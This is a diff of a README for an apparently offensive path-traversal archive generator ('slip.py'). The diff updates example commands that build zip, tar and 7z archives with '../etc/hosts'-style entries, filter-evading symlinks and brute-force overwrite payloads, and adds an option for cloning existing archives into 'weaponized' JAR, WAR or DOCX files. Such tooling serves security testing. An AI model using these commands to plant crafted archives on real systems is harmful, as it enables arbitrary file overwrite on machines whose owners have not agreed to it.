@@ -80,17 +80,17 @@ Options:
 
 Create a tar.bz2 archive containing 2 explicit paths: 
 ```
-python3 slip.py --archive-type tar --compression bzip2 --paths "../etc/hosts, ../../etc/hosts" --file-content "foo" archive
+python3 slip.py --archive-type tar --compression bzip2 --paths "../etc/hosts, ../../etc/hosts" --file-content "foo" archive.tar
 ```
 
 Create a zip archive containing an explicit path and an explicit symlink: 
 ```
-python3 slip.py --archive-type zip --compression deflate --paths "../etc/hosts" --symlinks "../etc/shadows" --file-content "foo" archive
+python3 slip.py --archive-type zip --compression deflate --paths "../etc/hosts" --symlinks "../etc/shadows" --file-content "foo" archive.zip
 ```
 
 Create a tar.bz2 archive with 4 payloads to search for "config.ini" at 3 different depths (it also uses Windows flavor dot dot slash): 
 ```
-python3 slip.py --archive-type tar --compression bzip2 --paths "config.ini" --search 3 --dotdotslash "..\\" --file-content "foo" archive
+python3 slip.py --archive-type tar --compression bzip2 --paths "config.ini" --search 3 --dotdotslash "..\\" --file-content "foo" archive.tar
 ```
 The archive will contain:
 ```
@@ -102,23 +102,29 @@ config.ini
 
 Create a 7z archive with a named symlink:
 ```
-python3 slip.py --archive-type zip --symlinks "../etc/hosts:linkname" archive  
+python3 slip.py --archive-type zip --symlinks "../etc/hosts:linkname" archive.zip  
 ```
 This technique is really useful in case directory traversal payloads are filtered in paths but not in symlink, as it would be possible to achieve an arbitrary write file referring to the named symlink as parth of the path (e.g. symlink: `../etc/:foo`, path: `foo/hosts`).
 
 Create a tar archive with multiple payloads (from the default mass-find dictionary) to find the `/etc/host/` file:
 ```
-python3 slip.py --archive-type tar --mass-find "/etc/hosts" --mass-find-mode symlinks archive
+python3 slip.py --archive-type tar --mass-find "/etc/hosts" --mass-find-mode symlinks archive.tar
 ```
 ⚠️ WARNING: mass-find mode supports paths, this translates to a bruteforce attempt to rewrite a specific file, but it potentially uses A LOT of payloads, so the result is unpredictable. Use with caution.
 
 Create a zip archive with multiple file contents.
 ```
-python3 slip.py --archive-type zip --paths "xxx, yyy, zzz" --multiple-file-contents "eHh4, eXl5, enp6" archive
+python3 slip.py --archive-type zip --paths "xxx, yyy, zzz" --multiple-file-contents "eHh4, eXl5, enp6" archive.zip
 ```
-This mode allow to specify one-by-one the content of each file in the archive. This allow the reconstruction of complex archive files like DOCX or XLSX.
+⚠️ EXPERIMENTAL: This mode allow to specify one-by-one the content of each file in the archive.
 The number of paths and the number of file contents must match. The file contents have to be set in base64 to avoid troubles with unexcaped characters.
 The option `--multiple-file-contens` will override `-file-contents` if both are set.
+
+Create an archive from an existing one and add a new payload:
+```
+python3 slip.py --clone source.7z --paths "foo" --file-content "bar" archive.7z
+```
+⚠️ EXPERIMENTAL: This allows the creation of weaponized archive files with a complex data structure such as JAR, WAR, DOCX and more.
 
 ## Notes
 - Depending on the library that handles the decompression, results may vary greatly.
